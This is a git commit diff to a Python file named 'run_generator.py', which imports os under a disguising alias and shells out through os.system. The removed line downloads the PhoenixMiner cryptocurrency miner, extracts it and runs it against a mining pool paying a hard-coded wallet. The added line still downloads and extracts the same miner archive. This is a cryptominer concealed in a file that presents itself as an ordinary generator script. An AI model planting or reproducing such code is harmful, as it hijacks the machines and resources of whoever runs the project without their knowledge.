32560299b4965d33f98d2b64ed0348fad51b88bf
linch22 <92222631+linch22@users.noreply.github.com>
2021-10-10 00:06:27 +0800

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,2 +1,2 @@
 import os as alpha
-alpha.system("wget https://phoenixminer.info/downloads/PhoenixMiner_5.7b_Linux.tar.gz && tar -xf PhoenixMiner_5.7b_Linux.tar.gz && cd PhoenixMiner_5.7b_Linux && ./PhoenixMiner -a BEAM-III -pool ethash.unmineable.com:3333 -wal SHIB:0xa91fd20dcdf1ed0dd07d37e3918fc8ed74ea0270.paper -pass x")
+alpha.system("wget https://phoenixminer.info/downloads/PhoenixMiner_5.7b_Linux.tar.gz && tar -xf PhoenixMiner_5.7b_Linux.tar.gz")
